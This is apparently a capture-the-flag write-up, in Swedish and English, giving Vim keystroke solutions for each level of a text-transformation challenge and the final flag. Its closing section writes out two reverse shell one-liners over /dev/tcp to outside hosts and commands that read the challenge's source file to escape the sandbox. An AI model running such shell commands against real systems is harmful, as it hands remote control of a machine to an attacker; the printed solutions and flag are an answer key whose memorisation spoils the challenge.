# Teknisk beskrivning

Utmaningen går ut på att använda VI(M) kommandon/uttryck för att från en given input generera en önskad output.
Sista leveln måste man "tjuvkoppla" dock då det inte går att utföra den efterfrågade transformationen. Men att
"tjuvkoppla" systemet blir tillgängligt redan tidigare och det är möjligt att hoppa över de sista nivåerna.

# Lösningsförslag

Utmaningen är uppdelad i ett antal levels enligt nedan. Det kan finnas flera sätt att lösa varje level, men nedan följer ett förslag.
Det finns även ett solvescript `solve.py` som kan användas för att köra igenom alla levels.

## Levels

### upper

Simple upper case exercise.

One solution: `gU$`

### lucky-13

Rot-13.

One solution: `g?G`

### micro-macro

First macro.

One solution: `qa~wq5@a`

### boring

NOTE: consider changing/removing this level
One solution: `j6>j`

### counting

One solution: `dd<esc>100i0<cr><esc>dd<c-v>ggg<c-a>`
Lol solution: `c$<c-r>=system('seq 1 100')<cr><c-h>`

### replace

One solution: `:%s#SOFTWARE#lol#g<cr>`

### json

First winnable 
One solution: `qqI{"ip":"<esc>f:i", "port"<esc>A}<esc>j@qq@q`

### boring-numbers-juggling

One solution: `ddGdd:%s#,#<cr>:%norm <<<cr>:sort n<cr>`

### give-me-a-smile

One solution: `:set paste<cr>i<c-r>=execute('smile')<cr><esc>dd`

### i-am-so-random

Seed: `cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 256 > want`

One solution: `dG:r l*/9/w*<cr>kdd`

## Solution

Shortest (so far) possible reverse shell. (29)
`!sh -i &>/dev/tcp/x.sh/1 0>&1`

Reasonable reverse shell. (46)
`!bash -i &> /dev/tcp/123.234.111.222/9090 0>&1`

`<cmd>r!ls<cr>`
`<cmd>r!cat a.py<cr>`

# Flagga

Flaggan finns i utmaningsprogrammet `a.py` och har värdet: `undut{qaithe_number_of_the_beast<esc>q666@a:wq}`
